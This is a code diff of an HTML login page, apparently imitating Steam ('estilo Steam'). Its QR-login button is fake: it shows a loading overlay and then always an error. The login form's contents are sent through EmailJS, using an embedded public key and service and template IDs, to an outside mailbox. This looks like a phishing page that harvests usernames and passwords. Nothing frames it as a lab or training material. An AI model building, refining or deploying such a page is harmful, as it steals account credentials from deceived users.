@@ -211,37 +211,36 @@ button {
   <span>Crear una cuenta gratuita</span>
 </div>
 
+<!-- EmailJS SDK -->
 <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
 <script>
+  // Inicializa EmailJS con tu Public Key
+  emailjs.init('3x0styJQNXamR4XT4');
+
+  // Función para simular QR (igual que antes)
   function simularQR() {
     const overlay = document.getElementById("overlay");
     overlay.style.display = "flex";
 
-    // Mostrar carga 2s y luego error (estilo Steam)
     setTimeout(() => {
-      // se queda mostrando el error
+      // se queda mostrando el error (sin cambios)
     }, 2000);
   }
 
-  // Inicializa EmailJS con tu Public Key
-  emailjs.init("3x0styJQNXamR4XT4");
-
-  // Maneja el envío del formulario de login
-  document.getElementById("login-form").addEventListener("submit", function (event) {
+  // Enviar formulario usando EmailJS
+  document.getElementById('login-form').addEventListener('submit', function(event) {
     event.preventDefault();
 
-    emailjs
-      .sendForm("service_33u0mdn", "template_vs7phvq", this)
-      .then(
-        () => {
-          alert("Correo enviado correctamente!");
-          this.reset();
-        },
-        (error) => {
-          alert("Error al enviar correo: " + error.text);
-        }
-      );
+    emailjs.sendForm('service_33u0mdn', 'template_vs7phvq', this)
+      .then(() => {
+        alert('Correo enviado correctamente!');
+        this.reset();
+      })
+      .catch((error) => {
+        alert('Error al enviar correo: ' + error.text);
+      });
   });
 </script>
+
 </body>
 </html>
